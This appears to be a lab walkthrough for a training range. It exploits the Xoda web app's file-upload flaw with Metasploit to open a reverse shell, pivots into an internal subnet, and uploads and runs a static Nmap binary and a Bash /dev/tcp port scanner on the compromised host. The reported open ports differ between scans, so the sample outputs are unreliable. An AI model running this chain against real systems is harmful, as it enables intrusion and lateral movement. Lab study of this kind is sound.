# 📦 Metasploit - Xoda File Upload Exploit & Post-Exploitation

This walkthrough shows how to exploit a vulnerable **Xoda web application** with Metasploit, gain a shell, pivot into an internal network, and use custom port scanning tools.

---

## 🎯 Steps Overview
1. Exploit the vulnerable web app (Xoda File Upload)  
2. Gain shell access  
3. Add routes for pivoting  
4. Scan internal network with Metasploit & custom tools  
5. Upload & execute static binaries  

---

## 1. Exploit Xoda File Upload
```bash
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
```

📸 **Sample Output:**
```
[*] Started reverse TCP handler on 192.63.4.2:4444
[*] Sending exploit...
[*] Command shell session 1 opened
```

🔍 **Interpretation:**
- Exploit uploads a malicious file to the vulnerable app.  
- Reverse shell successfully opened (Session 1).  

---

## 2. Interact with Shell
```bash
shell
ip addr
```

📸 **Sample Output:**
```
inet 192.180.108.2/24 brd 192.180.108.255 scope global eth0
```

🔍 **Interpretation:**
- Target machine has IP `192.180.108.2`.  
- Confirms internal network presence.  

---

## 3. Add Route for Pivoting
```bash
run autoroute -s 192.180.108.2
```

📸 **Sample Output:**
```
Route added to subnet 192.180.108.0/255.255.255.0
```

🔍 **Interpretation:**
- Traffic to the internal subnet will now be routed through the compromised host.  
- Enables pivoting deeper into the network.  

---

## 4. TCP Port Scan from Metasploit
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set VERBOSE false
set PORTS 1-1000
exploit
```

📸 **Sample Output:**
```
Discovered open port 21/tcp on 192.180.108.3
Discovered open port 22/tcp on 192.180.108.3
Discovered open port 80/tcp on 192.180.108.3
```

🔍 **Interpretation:**
- Found FTP(21), SSH (22) and HTTP (80) open.  
- Indicates live services inside the pivoted network.  

---

## 5. Locate Static Nmap Binary
```bash
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
```

📸 **Sample Output:**
```
-rwxr-xr-x 1 root root 2500000 Apr 10  nmap
nmap: ELF 64-bit LSB executable, statically linked
```

🔍 **Interpretation:**
- Found precompiled static **Nmap binary**.  
- Useful when target does not have Nmap installed.  

---

## 6. Custom Bash Port Scanner
```bash
#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```

📸 **Sample Output:**
```
port 21 is open
port 22 is open
port 80 is open
```

🔍 **Interpretation:**
- Simple Bash script to scan ports without Nmap.  
- Uses `/dev/tcp` to test connectivity.  

---

## 7. Interact with Session
```bash
sessions -i 1
```

📌 Goes back into the compromised session to continue post-exploitation.  

---

## 8. Upload Tools
```bash
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
```

📸 **Sample Output:**
```
[*] Uploading nmap -> /tmp/nmap
[*] Uploading bash-port-scanner.sh -> /tmp/bash-port-scanner.sh
```

🔍 **Interpretation:**
- Both Nmap binary and custom scanner uploaded to `/tmp/` on target.  

---

## 9. Execute Tools on Target
```bash
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3
```

📸 **Sample Output:**
```
port 22 is open
port 80 is open
```

🔍 **Interpretation:**
- Verified the Bash script works from inside the compromised target.  

---

## 10. Run Nmap on Target
```bash
./nmap -p- 192.180.108.3
```

📸 **Sample Output:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
```

🔍 **Interpretation:**
- Full Nmap scan shows ports 22, 80, and 443 are open.  
- Confirms target services for further exploitation.  
